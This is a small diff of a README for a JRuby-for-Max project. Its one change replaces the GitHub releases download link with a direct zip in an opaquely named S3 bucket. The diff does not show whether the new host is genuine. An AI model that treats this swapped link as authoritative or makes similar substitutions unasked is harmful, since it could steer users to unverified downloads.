@@ -7,7 +7,7 @@ Ruby support for [Max](http://cycling74.com/products/maxmspjitter/) and [Max for
 
 1.x version. Ready for general use.
 
-[DOWNLOAD IT HERE](https://github.com/adamjmurray/jruby_for_max/releases)
+[DOWNLOAD IT HERE](https://s3hub-26970d107940297a9dae7a83104f92a9d30730d0d6103f4385a508b86.s3.amazonaws.com/jruby_for_max/jruby_for_max-1.0.2.zip)
 
 
 ## Author ##
